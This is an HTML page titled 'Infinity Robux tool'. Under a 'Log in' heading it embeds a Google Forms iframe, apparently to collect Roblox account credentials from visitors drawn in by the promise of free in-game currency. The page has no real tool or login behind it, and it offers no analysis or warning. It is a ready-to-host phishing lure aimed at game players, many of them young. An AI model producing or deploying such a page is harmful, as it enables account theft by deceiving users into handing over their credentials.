<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Infinity Robux tool</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      background: #0f0f0f;
      color: white;
      font-family: Arial, Helvetica, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      width: 100%;
      max-width: 420px;
      background: #1a1a1a;
      border-radius: 12px;
      padding: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.6);
    }

    h1 {
      text-align: center;
      margin-bottom: 12px;
    }

    iframe {
      width: 100%;
      height: 520px;
      border: none;
      border-radius: 8px;
      background: white;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>Log in</h1>
    <iframe 
      src="https://docs.google.com/forms/d/e/1FAIpQLScQPI1GesErzZy_5sUddufuo9LW2ljMbQIY9JIcXNvP0FF7BA/viewform?embedded=true">
    </iframe>
  </div>
</body>
</html>
